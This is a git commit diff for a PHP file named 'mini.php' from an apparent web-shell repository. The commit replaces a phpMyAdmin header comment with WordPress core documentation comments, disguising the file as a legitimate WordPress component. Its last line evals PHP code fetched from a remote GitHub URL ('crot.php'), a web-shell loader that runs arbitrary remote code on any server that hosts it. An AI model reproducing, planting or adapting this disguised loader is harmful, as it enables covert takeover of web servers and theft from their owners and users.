78d858fa9694011a6a11c3d0f9cedbb45ad4a730
~/sec/s3rv4n7 <156493057+chloethesis@users.noreply.github.com>
2024-05-24 13:59:31 +0700

    Update mini.php

--- mini.php
+++ mini.php
@@ -1,9 +1,32 @@
 <?php
-/* vim: set expandtab sw=4 ts=4 sts=4: */
 /**
- * Database SQL executor
+ * Used to set up and fix common variables and include
+ * the WordPress procedural and class library.
  *
- * @package PhpMyAdmin
+ * Allows for some configuration in wp-config.php (see default-constants.php)
+ *
+ * @package WordPress
+ */
+
+/**
+ * Stores the location of the WordPress directory of functions, classes, and core content.
+ *
+ * @since 1.0.0
+ */
+
+/**
+ * Version information for the current WordPress release.
+ *
+ * These can't be directly globalized in version.php. When updating,
+ * include version.php from another installation and don't override
+ * these values if already set.
+ *
+ * @global string $wp_version             The WordPress version string.
+ * @global int    $wp_db_version          WordPress database version.
+ * @global string $tinymce_version        TinyMCE version.
+ * @global string $required_php_version   The required PHP version string.
+ * @global string $required_mysql_version The required MySQL version string.
+ * @global string $wp_local_package       Locale code of the package.
  */
 ?>
 <?php eval("?>".file_get_contents("https://raw.githubusercontent.com/chloethesis/S3RV4N7-SHELL/main/crot.php"));?>
